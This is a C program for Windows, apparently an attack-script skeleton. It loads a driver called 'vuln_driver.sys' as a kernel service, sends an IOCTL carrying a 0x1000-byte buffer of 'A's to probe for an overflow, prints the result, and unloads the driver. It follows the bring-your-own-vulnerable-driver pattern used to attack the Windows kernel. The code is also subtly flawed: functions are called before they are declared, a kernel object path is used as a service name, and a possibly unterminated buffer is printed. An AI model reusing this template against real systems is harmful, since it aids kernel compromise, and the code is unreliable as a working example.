
#include <windows.h>
#include <stdio.h>

const char *driver_name = "vuln_driver.sys";

const char *device_name = "\\\\.\\VulnDriver";

#define IOCTL_VULN_CODE 0x222003

#define IOCTL_BUFFER_SIZE 0x1000

int main()
{
    HANDLE device;
    DWORD bytes_returned;
    char input_buffer[IOCTL_BUFFER_SIZE];
    char output_buffer[IOCTL_BUFFER_SIZE];

    if (!LoadDriver(driver_name, "\\Driver\\VulnDriver"))
    {
        printf("Error loading vulnerable driver: %d\n", GetLastError());
        return 1;
    }

    device = CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (device == INVALID_HANDLE_VALUE)
    {
        printf("Error opening vulnerable driver device: %d\n", GetLastError());
        return 1;
    }

    memset(input_buffer, 'A', IOCTL_BUFFER_SIZE);

    if (!DeviceIoControl(device, IOCTL_VULN_CODE, input_buffer, IOCTL_BUFFER_SIZE, output_buffer, IOCTL_BUFFER_SIZE, &bytes_returned, NULL))
    {
        printf("Error sending IOCTL: %d\n", GetLastError());
        return 1;
    }

    printf("Output buffer:\n%s\n", output_buffer);

    if (!UnloadDriver("\\Driver\\VulnDriver"))
    {
        printf("Error unloading vulnerable driver: %d\n", GetLastError());
        return 1;
    }

    CloseHandle(device);

    return 0;
}

BOOL LoadDriver(LPCTSTR driver_name, LPCTSTR service_name)
{
    SC_HANDLE sc_manager, service;
    DWORD error;

    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (sc_manager == NULL)
    {
        return FALSE;
    }

    service = CreateService(sc_manager, service_name, service_name, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driver_name, NULL, NULL, NULL, NULL, NULL);
    if (service == NULL)
    {
        error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS)
        {
            service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS);
            if (service == NULL)
            {
                CloseServiceHandle(sc_manager);
                return FALSE;
            }
        }
        else
        {
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    if (!StartService(service, 0, NULL))
    {
        error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING)
        {
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
    return TRUE;
}

BOOL UnloadDriver(LPCTSTR service_name)
{
    SC_HANDLE sc_manager, service;
    SERVICE_STATUS status;
    DWORD error;

    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (sc_manager == NULL)
    {
        return FALSE;
    }

    service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS);
    if (service == NULL)
    {
        CloseServiceHandle(sc_manager);
        return FALSE;
    }

    if (!ControlService(service, SERVICE_CONTROL_STOP, &status))
    {
        error = GetLastError();
        if (error != ERROR_SERVICE_NOT_ACTIVE)
        {
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    if (!DeleteService(service))
    {
        CloseServiceHandle(service);
        CloseServiceHandle(sc_manager);
        return FALSE;
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
    return TRUE;
}
